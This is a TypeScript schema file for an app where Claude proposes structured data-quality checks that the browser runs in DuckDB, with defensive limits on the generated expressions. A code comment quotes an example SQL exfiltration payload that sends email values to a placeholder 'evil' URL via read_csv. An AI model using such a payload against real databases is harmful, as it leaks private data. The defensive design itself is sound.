import { z } from "zod";

/**
 * The hypothesis contract, shared by the Worker (which asks Claude for these)
 * and the browser (which evaluates them).
 *
 * Claude never emits raw SQL. It emits a structured *check*, so the FROM clause
 * is always ours and the result shape is always a violation count. That closes
 * the obvious exfiltration hole, where a generated query could smuggle data out
 * via something like read_csv('https://evil/?d=' || email).
 *
 * WIRE FORMAT NOTE: the wire schema is flat (every field required, unused ones
 * empty) rather than a discriminated union, because strict structured-output
 * JSON Schema wants all properties present and required. We normalise it into a
 * proper discriminated union the moment it arrives.
 */

export const SEVERITIES = ["high", "medium", "low"] as const;
export const SeveritySchema = z.enum(SEVERITIES);
export type Severity = z.infer<typeof SeveritySchema>;

export const CHECK_KINDS = ["row_predicate", "unique", "references"] as const;

export const WireHypothesisSchema = z.object({
  title: z
    .string()
    .describe(
      "A short, falsifiable claim stated as fact, e.g. 'discount is between 0 and 1'.",
    ),
  rationale: z
    .string()
    .describe(
      "One or two sentences citing the specific profile statistics that motivated this hypothesis.",
    ),
  severity: SeveritySchema.describe(
    "How damaging it would be if this turned out to be false.",
  ),
  kind: z
    .enum(CHECK_KINDS)
    .describe(
      "'row_predicate' for a boolean expression true of every row of one table; 'unique' to assert a column set has no duplicates; 'references' to assert every value in one table appears in another.",
    ),
  table: z
    .string()
    .describe(
      "The table this check runs against, exactly as named in the profile. For 'references' this is the table whose values must be found elsewhere.",
    ),
  columns: z
    .array(z.string())
    .describe(
      "For kind='unique': the columns that together should be unique. For kind='references': the column(s) in `table` whose values must appear in the referenced table. Empty for 'row_predicate'.",
    ),
  expression: z
    .string()
    .describe(
      "For kind='row_predicate': a DuckDB boolean expression over `table`'s columns that must be TRUE for every row, e.g. \"discount >= 0 AND discount <= 1\". Must not contain SELECT, subqueries, semicolons, comments, or any function that reads a file or URL. Empty string for other kinds.",
    ),
  referencesTable: z
    .string()
    .describe(
      "For kind='references': the table that must contain the values. Empty string for other kinds.",
    ),
  referencesColumns: z
    .array(z.string())
    .describe(
      "For kind='references': the column(s) in referencesTable to match against, in the same order as `columns`. Empty for other kinds.",
    ),
});

export const WireHypothesesSchema = z.object({
  hypotheses: z.array(WireHypothesisSchema),
});

export type WireHypothesis = z.infer<typeof WireHypothesisSchema>;
export type WireHypotheses = z.infer<typeof WireHypothesesSchema>;

/* ---------------------------------------------------------------- app types */

export type Check =
  | { kind: "row_predicate"; table: string; expression: string }
  | { kind: "unique"; table: string; columns: string[] }
  | {
      kind: "references";
      table: string;
      columns: string[];
      referencesTable: string;
      referencesColumns: string[];
    };

export interface Hypothesis {
  id: string;
  title: string;
  rationale: string;
  severity: Severity;
  check: Check;
}

/** Every table a check touches, for display and validation. */
export function tablesInCheck(check: Check): string[] {
  return check.kind === "references"
    ? [check.table, check.referencesTable]
    : [check.table];
}

export function isCrossTable(check: Check): boolean {
  return check.kind === "references" && check.table !== check.referencesTable;
}

/** Outcome of evaluating one hypothesis locally against DuckDB. */
export type HypothesisResult =
  | { status: "holds"; violations: 0; rowCount: number; ms: number; sql: string }
  | {
      status: "falsified";
      violations: number; rowCount: number; pct: number; ms: number; sql: string;
    }
  | { status: "skipped"; reason: string; sql?: string };

/**
 * Turn the flat wire form into the discriminated union, dropping anything
 * malformed. Ids are assigned here so they are stable for React keys and are
 * never model-controlled.
 */
export function normalizeHypotheses(wire: WireHypotheses): Hypothesis[] {
  const out: Hypothesis[] = [];
  wire.hypotheses.forEach((h, i) => {
    const base = {
      id: `h${i + 1}`,
      title: h.title.trim(),
      rationale: h.rationale.trim(),
      severity: h.severity,
    };
    const table = h.table.trim();
    if (table === "") return;

    if (h.kind === "unique") {
      if (h.columns.length === 0) return;
      out.push({ ...base, check: { kind: "unique", table, columns: h.columns } });
      return;
    }

    if (h.kind === "references") {
      const refTable = h.referencesTable.trim();
      // A containment check needs both sides, and the same number of columns on
      // each, or the generated join would be meaningless.
      if (refTable === "" || h.columns.length === 0) return;
      if (h.columns.length !== h.referencesColumns.length) return;
      out.push({
        ...base,
        check: {
          kind: "references",
          table,
          columns: h.columns,
          referencesTable: refTable,
          referencesColumns: h.referencesColumns,
        },
      });
      return;
    }

    if (h.expression.trim() === "") return;
    out.push({
      ...base,
      check: { kind: "row_predicate", table, expression: h.expression.trim() },
    });
  });
  return out;
}

/* ----------------------------------------------------------------- exchange */

/**
 * A verbatim record of the single exchange with the model, returned to the
 * client so the user can read exactly what was asked and what came back.
 *
 * `system` and `userMessage` are the actual strings sent, not a reconstruction —
 * the whole point of showing them is that they are the real thing.
 */
export interface Exchange {
  model: string;
  system: string;
  userMessage: string;
  /** The model's structured output, pretty-printed. */
  responseJson: string;
  stopReason: string | null;
  latencyMs: number;
  inputTokens: number;
  outputTokens: number;
  /**
   * Number of HTTP requests actually made. Measured, not assumed: the design
   * makes exactly one request per run, and anything above 1 means the SDK
   * retried a transient failure (the same single query, resent).
   */
  httpAttempts: number;
  /** Hypotheses returned before any were dropped as malformed. */
  hypothesesReturned: number;
  /** 1-based round this exchange belongs to. */
  round: number;
}
